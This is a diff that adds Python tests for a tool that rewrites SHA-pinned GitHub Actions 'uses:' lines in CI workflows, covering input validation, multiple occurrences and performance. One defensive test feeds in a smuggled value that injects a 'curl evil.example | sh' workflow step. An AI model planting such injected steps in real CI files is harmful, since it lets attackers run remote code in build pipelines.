@@ -366,3 +366,146 @@ def test_sha_refusal_when_all_occurrences_sha_pinned(
     results = rewrite_gha_uses(wf, edits)
     assert not results[0].applied
     assert "SHA-pinned" in results[0].reason
+
+
+# ---------------------------------------------------------------------------
+# extra["new_sha"] grammar gate — the SHA path splices extra values,
+# so they get the same chokepoint discipline as new_value
+# ---------------------------------------------------------------------------
+
+def test_sha_pinned_rejects_non_sha_new_sha(tmp_path: Path) -> None:
+    """``extra["new_sha"]`` is spliced verbatim into a workflow line
+    (a file that executes in CI) — anything that isn't a 40-hex
+    commit SHA must be refused, not written."""
+    wf = _workflow_path(tmp_path)
+    original = (
+        "      - uses: actions/checkout@"
+        "de0fac2e4500dabe0009e67214ff5f5447ce83dd  # was v6\n"
+    )
+    wf.write_text(original)
+    edits = [RewriteEdit(
+        locator="actions/checkout",
+        old_value="v6", new_value="v7",
+        extra={
+            "old_sha": "de0fac2e4500dabe0009e67214ff5f5447ce83dd",
+            "new_sha": "evil\n      - run: curl evil.example | sh #",
+        },
+    )]
+    results = rewrite_gha_uses(wf, edits)
+    assert not results[0].applied
+    assert "invalid_new_value" in results[0].reason
+    assert wf.read_text() == original
+
+
+def test_sha_pinned_rejects_missing_new_sha(tmp_path: Path) -> None:
+    wf = _workflow_path(tmp_path)
+    original = (
+        "      - uses: actions/checkout@"
+        "de0fac2e4500dabe0009e67214ff5f5447ce83dd  # was v6\n"
+    )
+    wf.write_text(original)
+    edits = [RewriteEdit(
+        locator="actions/checkout",
+        old_value="v6", new_value="v7",
+        extra={"old_sha": "de0fac2e4500dabe0009e67214ff5f5447ce83dd"},
+    )]
+    results = rewrite_gha_uses(wf, edits)
+    assert not results[0].applied
+    assert wf.read_text() == original
+
+
+def test_sha_pinned_rejects_uppercase_hex_new_sha(tmp_path: Path) -> None:
+    """Grammar is lowercase 40-hex (git object ids); mixed case is
+    refused rather than normalised — the resolver upstream should
+    only ever hand us canonical ids."""
+    wf = _workflow_path(tmp_path)
+    original = (
+        "      - uses: actions/checkout@"
+        "de0fac2e4500dabe0009e67214ff5f5447ce83dd  # was v6\n"
+    )
+    wf.write_text(original)
+    edits = [RewriteEdit(
+        locator="actions/checkout",
+        old_value="v6", new_value="v7",
+        extra={
+            "old_sha": "de0fac2e4500dabe0009e67214ff5f5447ce83dd",
+            "new_sha": "F" * 40,
+        },
+    )]
+    results = rewrite_gha_uses(wf, edits)
+    assert not results[0].applied
+    assert wf.read_text() == original
+
+
+def test_sha_pinned_multiple_occurrences_all_bumped(tmp_path: Path) -> None:
+    """The same action is routinely SHA-pinned in several jobs of one
+    workflow. EVERY occurrence at the plan's old (SHA, tag) pair must
+    be bumped — a first-match verdict left the later jobs on the old
+    SHA while the run reported applied."""
+    old = "de0fac2e4500dabe0009e67214ff5f5447ce83dd"
+    new = "ffffffffffffffffffffffffffffffffffffffff"
+    wf = _workflow_path(tmp_path)
+    wf.write_text(
+        f"      - uses: actions/checkout@{old}  # was v6\n"
+        "      - run: make test\n"
+        f"      - uses: actions/checkout@{old}  # was v6\n"
+    )
+    edits = [RewriteEdit(
+        locator="actions/checkout",
+        old_value="v6", new_value="v7",
+        extra={"old_sha": old, "new_sha": new},
+    )]
+    results = rewrite_gha_uses(wf, edits)
+    assert results[0].applied
+    text = wf.read_text()
+    assert text.count(f"@{new}") == 2
+    assert old not in text
+    assert text.count("# was v7") == 2
+
+
+def test_sha_pinned_mixed_first_already_bumped_still_applies(
+    tmp_path: Path,
+) -> None:
+    """A partially-bumped file (one occurrence already at the new SHA,
+    one still at the old) must still bump the remaining occurrence —
+    a first-match verdict read the bumped line and returned
+    no_change."""
+    old = "de0fac2e4500dabe0009e67214ff5f5447ce83dd"
+    new = "ffffffffffffffffffffffffffffffffffffffff"
+    wf = _workflow_path(tmp_path)
+    wf.write_text(
+        f"      - uses: actions/checkout@{new}  # was v7\n"
+        f"      - uses: actions/checkout@{old}  # was v6\n"
+    )
+    edits = [RewriteEdit(
+        locator="actions/checkout",
+        old_value="v6", new_value="v7",
+        extra={"old_sha": old, "new_sha": new},
+    )]
+    results = rewrite_gha_uses(wf, edits)
+    assert results[0].applied
+    text = wf.read_text()
+    assert old not in text
+    assert text.count(f"@{new}") == 2
+
+
+def test_blank_line_run_is_fast(tmp_path: Path) -> None:
+    """Sibling of the helm rewriter's blank-run quadratic — the
+    ``^\\s*`` indent idiom; horizontal-only indent is linear and the
+    step after the run still bumps."""
+    import time
+
+    wf = tmp_path / "ci.yml"
+    wf.write_text(
+        "jobs:\n"
+        + "\n" * 65536
+        + "      - uses: actions/checkout@v3\n"
+    )
+    edits = [RewriteEdit(
+        locator="actions/checkout", old_value="v3", new_value="v4",
+    )]
+    start = time.monotonic()
+    results = rewrite_gha_uses(wf, edits)
+    assert time.monotonic() - start < 5.0
+    assert results[0].applied
+    assert "actions/checkout@v4" in wf.read_text()
